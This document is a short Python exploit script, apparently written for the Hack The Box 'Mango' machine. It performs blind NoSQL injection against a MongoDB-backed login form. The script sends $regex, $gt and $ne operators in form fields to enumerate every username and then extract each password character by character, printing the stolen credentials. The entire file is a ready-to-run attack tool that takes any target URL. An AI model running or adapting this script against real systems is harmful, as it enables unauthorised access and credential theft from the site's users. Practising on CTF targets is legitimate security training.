#!/usr/bin/env python3
from re import escape
from requests import post
from string import ascii_letters,digits,punctuation
from sys import argv
'''
This scripts performs a nosql injection into mongodb databases, using the power
of regex searches via the $regex operator in combination with $ne and the $gt
operator to test for valid usernames and passwords.The code was created initially
to help with the exploitation of the mango machine on hackthebox.eu. This script
can be modified to dump other fields, too.
'''

try:
	target = argv[1]
except:
	print('missing target url')
	exit()

pool = ascii_letters+digits+punctuation
exclude = '$^&*|.+\\?'

def is_valid_password(user,pwd):
	query = 'username={}'.format(user)
	query += '&password[$regex]=^{}.*'.format(pwd)
	query += '&login=login'
	head = {'Content-Type' : 'application/x-www-form-urlencoded'}
	resp = post(target,data=query,headers=head,allow_redirects=False)
	return resp.status_code == 302

def is_valid_user(user,exclude=[]):
	query = 'username[$regex]=^{}.*'.format(user)
	query += '&password[$gt]='
	query += '&login=login'
	head = {'Content-Type' : 'application/x-www-form-urlencoded'}
	resp = post(target,data=query,headers=head,allow_redirects=False)
	if resp.status_code == 302:
		for exc_user in exclude:
			exclude_check = query+'&username[$ne]='+exc_user
			if post(target,data=exclude_check,headers=head,allow_redirects=False).status_code != 302:
				return False
		return True
	else:
		return False

def iterate_password(user,password=''):
	for char in pool:
		if not char in exclude:
			tmp_pwd = password+char
			if is_valid_password(user,tmp_pwd):
				return iterate_password(user,tmp_pwd)
	return tmp_pwd

def iterate_user(startchars,already_found=[]):
	user = startchars
	for char in pool:
		if not char in exclude:
			tmp_user = user+char
			if is_valid_user(tmp_user,already_found):
				print(tmp_user,end='\r')
				return iterate_user(tmp_user,already_found)
	print("",end='\r')
	return user

def dump_users():
	found = []
	while True:
		user_found = False
		for char in pool:
			if char not in exclude:
				if is_valid_user(char,found):
					found.append(iterate_user(char,found))
					user_found = True
					print('[+]Found user:',found[-1])

		if not user_found:
			return found

def dump_passwords(users):
	for user in users:
		print('[*]Password for {}: '.format(user),end='')
		print(iterate_password(user))

print('[*]Dumping all users...')
all_users = dump_users()
print('[*]Dumping passwords for {} users'.format(len(all_users)))
dump_passwords(all_users)
